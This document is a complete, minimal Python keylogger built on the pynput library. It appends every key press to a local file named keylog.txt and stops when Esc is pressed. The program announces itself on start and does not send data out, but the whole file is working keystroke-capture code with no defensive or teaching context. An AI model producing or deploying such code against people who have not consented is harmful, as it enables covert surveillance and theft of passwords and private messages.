import pynput
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

def on_release(key):
    if key == Key.esc:
        return False

def main():
    print("Keylogger started. Press Esc to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
